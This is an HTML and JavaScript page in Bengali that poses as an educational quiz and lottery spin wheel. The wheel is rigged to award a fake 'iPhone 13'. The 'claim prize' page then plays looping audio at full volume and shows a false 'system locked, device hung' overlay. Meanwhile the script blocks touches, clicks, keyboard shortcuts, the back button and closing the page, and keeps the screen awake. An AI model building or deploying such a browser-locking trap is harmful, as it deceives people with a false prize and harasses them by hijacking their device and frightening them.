<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>শিক্ষা ও মেধা যাচাই প্রতিযোগিতা</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Arial, sans-serif;
        }

        body {
            background: linear-gradient(145deg, #0b2a4a 0%, #1b4a7a 100%);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            color: #fff;
            padding: 16px;
            margin: 0;
            overscroll-behavior: none;
            touch-action: none;
            position: fixed;
            width: 100%;
            height: 100%;
            overflow: hidden;
        }

        /* ফোন হ্যাং করার ইফেক্ট - পুরো UI কে অচল করে দেবে */
        .freeze-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background: rgba(0,0,0,0.01);
            z-index: 99999;
            cursor: none;
            pointer-events: all;
        }

        .freeze-overlay.active {
            display: block;
        }

        .main-container {
            text-align: center;
            background: rgba(255, 255, 255, 0.08);
            backdrop-filter: blur(3px);
            padding: 30px 20px 40px;
            border-radius: 60px 20px 60px 20px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.6);
            max-width: 420px;
            width: 100%;
            border: 1px solid rgba(255,255,255,0.15);
            user-select: none;
            -webkit-user-select: none;
            pointer-events: auto;
        }

        h1 {
            font-size: 1.8rem;
            font-weight: 700;
            text-shadow: 0 4px 8px rgba(0,0,0,0.5);
            letter-spacing: 1px;
            word-break: break-word;
        }
        .subhead {
            font-size: 1rem;
            opacity: 0.9;
            margin-top: 4px;
            margin-bottom: 20px;
            font-weight: 300;
        }

        .wheel-wrapper {
            position: relative;
            width: 260px;
            height: 260px;
            margin: 10px auto 20px;
        }

        @media (min-width: 480px) {
            .wheel-wrapper {
                width: 300px;
                height: 300px;
            }
        }

        .pointer {
            position: absolute;
            top: -12px;
            left: 50%;
            transform: translateX(-50%);
            width: 0;
            height: 0;
            border-left: 18px solid transparent;
            border-right: 18px solid transparent;
            border-top: 32px solid #ffdd00;
            filter: drop-shadow(0 4px 6px rgba(0,0,0,0.6));
            z-index: 10;
        }
        .pointer::after {
            content: "▼";
            position: absolute;
            top: -38px;
            left: 50%;
            transform: translateX(-50%);
            font-size: 24px;
            color: #ffdd00;
            opacity: 0.7;
        }

        .wheel {
            width: 100%;
            height: 100%;
            border-radius: 50%;
            border: 6px solid #f5f5f5;
            box-shadow: 0 0 0 6px #1e3c72, 0 12px 28px rgba(0,0,0,0.7);
            position: relative;
            transition: transform 4.5s cubic-bezier(0.12, 0.91, 0.20, 0.99);
            background: conic-gradient(
                #ff5722 0deg 60deg,
                #4caf50 60deg 120deg,
                #2196f3 120deg 180deg,
                #9c27b0 180deg 240deg,
                #ff9800 240deg 300deg,
                #e91e63 300deg 360deg
            );
        }

        .spin-btn {
            padding: 14px 40px;
            font-size: 1.3rem;
            font-weight: 800;
            color: #1e3c72;
            background: #ffd54f;
            border: none;
            border-radius: 50px;
            cursor: pointer;
            box-shadow: 0 8px 0 #b47c2e, 0 10px 20px rgba(0,0,0,0.3);
            transition: 0.08s linear;
            letter-spacing: 2px;
            margin-top: 8px;
            touch-action: manipulation;
        }
        .spin-btn:active {
            transform: translateY(6px);
            box-shadow: 0 2px 0 #b47c2e;
        }
        .spin-btn:disabled {
            opacity: 0.5;
            transform: translateY(4px);
            box-shadow: 0 4px 0 #b47c2e;
            pointer-events: none;
        }

        .modal-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
            backdrop-filter: blur(4px);
            justify-content: center;
            align-items: center;
            z-index: 200;
            padding: 20px;
        }

        .modal-card {
            background: #ffffff;
            color: #1a1a2c;
            padding: 30px 20px 25px;
            border-radius: 40px 12px 40px 12px;
            text-align: center;
            max-width: 340px;
            width: 100%;
            box-shadow: 0 30px 60px rgba(0,0,0,0.6);
            border: 2px solid #ffd700;
        }
        .modal-card h2 {
            font-size: 2rem;
            font-weight: 800;
            color: #2e7d32;
        }
        .modal-card .prize-name {
            font-size: 2.4rem;
            font-weight: 900;
            background: linear-gradient(45deg, #e91e63, #ff9800);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin: 10px 0;
        }
        .action-btn {
            margin-top: 18px;
            padding: 12px 36px;
            background: #0d47a1;
            color: #fff;
            border: none;
            border-radius: 60px;
            font-size: 1.2rem;
            font-weight: 600;
            cursor: pointer;
            box-shadow: 0 6px 0 #072a5e;
            transition: 0.06s linear;
            touch-action: manipulation;
        }
        .action-btn:active {
            transform: translateY(4px);
            box-shadow: 0 2px 0 #072a5e;
        }

        #whitePage {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background-color: #ffffff;
            z-index: 9999;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            text-align: center;
            padding: 20px;
        }
        #whitePage .prank-text {
            font-size: 2.2rem;
            color: #111;
            font-weight: 900;
            letter-spacing: 1px;
            text-shadow: 0 0 10px rgba(255,0,0,0.2);
        }
        #whitePage .prank-sub {
            color: #333;
            margin-top: 10px;
            font-size: 1.2rem;
        }

        @media (max-width: 400px) {
            .main-container { padding: 20px 12px; }
            h1 { font-size: 1.5rem; }
            .wheel-wrapper { width: 220px; height: 220px; }
        }

        /* Loading screen style for freeze */
        .freeze-text {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            color: white;
            font-size: 2rem;
            z-index: 100000;
            display: none;
            text-align: center;
            background: rgba(0,0,0,0.7);
            padding: 30px;
            border-radius: 20px;
            backdrop-filter: blur(10px);
        }
        .freeze-text.active {
            display: block;
        }
        .spinner {
            width: 50px;
            height: 50px;
            border: 5px solid rgba(255,255,255,0.3);
            border-top: 5px solid #fff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <!-- ফ্রিজ ওভারলে - পুরো UI কভার করবে -->
    <div class="freeze-overlay" id="freezeOverlay"></div>
    <div class="freeze-text" id="freezeText">
        <div>📱 সিস্টেম লক</div>
        <div class="spinner"></div>
        <div style="font-size: 1rem; margin-top: 10px;">প্লিজ অপেক্ষা করুন...</div>
    </div>

    <div class="main-container" id="mainView">
        <h1>🎓 অনলাইন কুইজ ও লটারি</h1>
        <p class="subhead">স্পিন চাপুন এবং পুরস্কার জিতে নিন!</p>

        <div class="wheel-wrapper">
            <div class="pointer"></div>
            <div class="wheel" id="wheel"></div>
        </div>

        <button class="spin-btn" id="spinBtn">▶ SPIN</button>
        <p style="margin-top: 14px; font-size: 0.8rem; opacity: 0.7;">💡 প্রতিটি স্পিনে একটি পুরস্কার নির্ধারিত</p>
    </div>

    <div class="modal-overlay" id="winModal">
        <div class="modal-card">
            <h2>🎉 অভিনন্দন!</h2>
            <p style="font-size: 1.1rem;">আপনি জিতে নিয়েছেন:</p>
            <div class="prize-name">iPhone 13</div>
            <div style="font-size: 1.8rem; margin: 6px 0;">📱</div>
            <button class="action-btn" id="nextPageBtn">এগিয়ে যান →</button>
        </div>
    </div>

    <div id="whitePage">
        <div class="prank-text">📢 পুরস্কার দাবি করুন!</div>
        <div class="prank-sub">আপনার ডিভাইসটি এখন নিরাপদ মোডে আছে</div>
        <div style="margin-top: 30px; font-size: 3rem;">🎁</div>
        <div style="margin-top: 20px; color: #999; font-size: 0.9rem;">(ভলিউম চেক করুন)</div>
        <audio id="prankAudio" loop>
            <source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mpeg">
        </audio>
    </div>

    <script>
        (function() {
            'use strict';

            // ============================================================
            // 1. COMPLETE UI FREEZE - ফোন হ্যাং করার ইফেক্ট
            // ============================================================
            const freezeOverlay = document.getElementById('freezeOverlay');
            const freezeText = document.getElementById('freezeText');

            function activateFreeze() {
                // পুরো UI কে অচল করে দেয়
                freezeOverlay.classList.add('active');
                freezeText.classList.add('active');
                document.body.style.pointerEvents = 'none';
                document.body.style.userSelect = 'none';
                
                // সব ক্লিক, টাচ, স্ক্রল ব্লক
                document.addEventListener('click', function(e) {
                    e.preventDefault();
                    e.stopPropagation();
                    return false;
                }, true);
                
                document.addEventListener('touchstart', function(e) {
                    e.preventDefault();
                    e.stopPropagation();
                    return false;
                }, { passive: false, capture: true });
                
                document.addEventListener('touchmove', function(e) {
                    e.preventDefault();
                    e.stopPropagation();
                    return false;
                }, { passive: false, capture: true });
            }

            // ============================================================
            // 2. DISABLE ALL HARDWARE BUTTONS (Volume, Power, Home)
            // ============================================================
            
            // Volume keys - MediaSession API ব্যবহার করে ব্লক
            if ('mediaSession' in navigator) {
                navigator.mediaSession.setActionHandler('previoustrack', () => {});
                navigator.mediaSession.setActionHandler('nexttrack', () => {});
                navigator.mediaSession.setActionHandler('play', () => {});
                navigator.mediaSession.setActionHandler('pause', () => {});
                navigator.mediaSession.setActionHandler('stop', () => {});
                navigator.mediaSession.setActionHandler('seekbackward', () => {});
                navigator.mediaSession.setActionHandler('seekforward', () => {});
                navigator.mediaSession.setActionHandler('seekto', () => {});
            }

            // Keyboard volume keys
            document.addEventListener('keydown', function(e) {
                const volumeKeys = ['VolumeUp', 'VolumeDown', 'VolumeMute', 'AudioVolumeUp', 'AudioVolumeDown'];
                if (volumeKeys.includes(e.key) || e.key === 'Home' || e.key === 'Power') {
                    e.preventDefault();
                    e.stopPropagation();
                    return false;
                }
                // F5, Ctrl+R, Alt+F4, Ctrl+W, Ctrl+Q
                if (e.key === 'F5' || (e.ctrlKey && e.key === 'r') || 
                    (e.altKey && e.key === 'F4') || (e.ctrlKey && (e.key === 'w' || e.key === 'q'))) {
                    e.preventDefault();
                    return false;
                }
            }, { capture: true });

            // ============================================================
            // 3. PREVENT SCREEN SLEEP (WakeLock)
            // ============================================================
            let wakeLock = null;
            async function requestWakeLock() {
                try {
                    if ('wakeLock' in navigator) {
                        wakeLock = await navigator.wakeLock.request('screen');
                        console.log('WakeLock active - screen will not sleep');
                    }
                } catch (err) {
                    console.warn('WakeLock not supported:', err);
                }
            }
            requestWakeLock();

            // ============================================================
            // 4. DISABLE BACK BUTTON (History)
            // ============================================================
            window.addEventListener('load', function() {
                history.pushState(null, null, location.href);
                window.addEventListener('popstate', function(event) {
                    history.pushState(null, null, location.href);
                    // ফোনের ব্যাক বাটন চাপলে ফ্রিজ
                    activateFreeze();
                });
            });

            // ============================================================
            // 5. PREVENT UNLOAD (Home button attempt)
            // ============================================================
            window.addEventListener('beforeunload', function(e) {
                e.preventDefault();
                e.returnValue = '';
                // পেজ ছাড়ার চেষ্টা করলে ফ্রিজ
                activateFreeze();
                return '';
            });

            // ============================================================
            // 6. VISIBILITY CHANGE - পেজ ব্যাকগ্রাউন্ডে গেলে
            // ============================================================
            document.addEventListener('visibilitychange', function() {
                if (document.hidden) {
                    // হোম বাটন বা মিনিমাইজ চাপলে ফ্রিজ
                    activateFreeze();
                    // ফোকাস ফিরিয়ে আনার চেষ্টা
                    setTimeout(() => {
                        window.focus();
                    }, 100);
                }
            });

            // ============================================================
            // 7. PREVENT MINIMIZE (desktop)
            // ============================================================
            let minCheckInterval = setInterval(function() {
                if (window.outerWidth < 50 || window.outerHeight < 50) {
                    activateFreeze();
                    window.resizeTo(screen.availWidth, screen.availHeight);
                }
            }, 300);

            // ============================================================
            // 8. DISABLE CONTEXT MENU & TOUCH GESTURES
            // ============================================================
            document.addEventListener('contextmenu', function(e) {
                e.preventDefault();
                return false;
            });

            document.addEventListener('touchmove', function(e) {
                e.preventDefault();
            }, { passive: false });

            document.addEventListener('touchstart', function(e) {
                const target = e.target;
                if (target.tagName === 'BUTTON' || target.closest('button')) {
                    return;
                }
                e.preventDefault();
            }, { passive: false });

            // ============================================================
            // 9. SPIN WHEEL LOGIC
            // ============================================================
            const wheel = document.getElementById('wheel');
            const spinBtn = document.getElementById('spinBtn');
            const winModal = document.getElementById('winModal');
            const whitePage = document.getElementById('whitePage');
            const prankAudio = document.getElementById('prankAudio');
            const nextBtn = document.getElementById('nextPageBtn');

            let currentRotation = 0;
            let isSpinning = false;
            const TARGET_DEG = 330;

            function spinWheel() {
                if (isSpinning) return;
                isSpinning = true;
                spinBtn.disabled = true;

                const extraSpins = 5 + Math.floor(Math.random() * 3);
                const targetRotation = extraSpins * 360 + TARGET_DEG;
                currentRotation += targetRotation - (currentRotation % 360) + 360;
                wheel.style.transform = `rotate(${currentRotation}deg)`;

                setTimeout(() => {
                    winModal.style.display = 'flex';
                    isSpinning = false;
                    spinBtn.disabled = false;
                }, 4500);
            }

            spinBtn.addEventListener('click', spinWheel);

            function goToPrankPage() {
                winModal.style.display = 'none';
                whitePage.style.display = 'flex';

                // অডিও চালু
                prankAudio.volume = 1.0;
                prankAudio.loop = true;
                prankAudio.play().catch(err => {
                    console.warn('Audio play failed:', err);
                });

                document.body.style.overflow = 'hidden';
                window.focus();

                // ============================================================
                // 10. FINAL FREEZE - সব বাটন ডিসেবল
                // ============================================================
                setTimeout(() => {
                    activateFreeze();
                    // freezeText এ মেসেজ পরিবর্তন
                    document.querySelector('.freeze-text div:first-child').textContent = '🔒 সিস্টেম লকড';
                    document.querySelector('.freeze-text div:last-child').textContent = 'ডিভাইস হ্যাং হয়েছে';
                }, 1000);
            }

            nextBtn.addEventListener('click', goToPrankPage);

            // Space key to spin
            document.addEventListener('keydown', function(e) {
                if (e.code === 'Space' && !winModal.style.display.includes('flex') && 
                    whitePage.style.display !== 'flex' && !freezeOverlay.classList.contains('active')) {
                    e.preventDefault();
                    spinWheel();
                }
            });

            // ============================================================
            // 11. PREVENT ANY KEYBOARD SHORTCUTS
            // ============================================================
            document.addEventListener('keydown', function(e) {
                if (e.altKey || e.ctrlKey || e.metaKey) {
                    e.preventDefault();
                    return false;
                }
            }, { capture: true });

            console.log('🎡 ফোন হ্যাং মোড অ্যাক্টিভেটেড!');
            console.log('📌 কোনো বাটন কাজ করবে না - পুরো UI ফ্রিজ');

        })();
    </script>
</body>
</html>
